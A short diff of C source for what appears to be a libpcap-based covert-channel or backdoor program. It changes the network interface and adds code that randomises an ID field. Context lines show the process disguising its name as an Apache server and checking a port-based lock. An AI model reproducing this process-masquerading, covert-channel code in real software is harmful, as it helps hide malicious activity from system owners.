@@ -43,7 +43,7 @@
 
 #define BIT_SET(a,b) ((a) |= (1<<(b)))
 #define MASK "/usr/sbin/apache2 -k start -DSSL"
-#define NIC "wlan0"
+#define NIC "wlp3s0"
 
 #define DEST_ADDR "127.0.0.1"
 
@@ -101,7 +101,7 @@ void check_lock(int addr, int port)
 void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
 	int size = header->len;
-	int guess;
+	int guess, caesar_ten, caesar_one;
 	char sourceIP[INET_ADDRSTRLEN];
 	unsigned short iphdrlen;
 	struct in_addr source;
@@ -142,6 +142,14 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 			default:
 				break;
 		}
+
+		id = id % 10000;
+		id = id % 1000;
+
+		srand(time(NULL));
+
+		id += (int)((rand() % 3) * 10000);
+		id += (int)(((rand() % 5) + 1) * 1000);
 	}
 }
 
@@ -237,7 +245,6 @@ int main(int argc, char *argv[])
 	pcap_t *handle;         // session handle
 	bpf_u_int32 mask;       // netmask
 	bpf_u_int32 net;        // ip of dev
-	
 
 	mask_application(argv[0]);
 
